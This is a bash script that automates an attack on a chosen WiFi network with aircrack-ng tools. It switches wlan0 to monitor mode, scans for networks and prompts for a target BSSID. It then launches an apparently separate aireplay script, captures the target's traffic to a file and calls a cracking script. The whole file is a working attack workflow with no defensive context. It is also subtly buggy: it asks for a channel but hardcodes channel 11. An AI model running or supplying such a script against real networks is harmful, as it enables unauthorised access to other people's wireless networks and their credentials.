#!/bin/bash
# airodump-ng capture script
clear
mkdir ~/scans/backup 2>/dev/null
echo "Previous scans will be moved to ~/scans/backup"
mv --backup=numbered ~/scans/* ~/scans/backup 2>/dev/null
#disable wireless lan 0
ifconfig wlan0 down
# set wireless lan 0 to monitor mode
iwconfig wlan0 mode monitor
# kill conflicting processes
airmon-ng check kill

echo -e "\e[43mPress control+c to end capture"
echo "captures will be stored as ~/scans/scan-01.cap"
read -n 1 -s -r -p "Press any key to continue"
# listen to wlan 0 for available wifi networks
airodump-ng wlan0
#set variables
echo "Enter a BSSID to target"
read bssid
echo "Which channel"
read channel
#make bssid variable available to aireplay.sh
export bssid
	gnome-terminal -e ~/aireplay.sh 
	airodump-ng -c 11 --bssid $bssid -w ~/scans/scan wlan0

NetworkManager
~/aircrack.sh
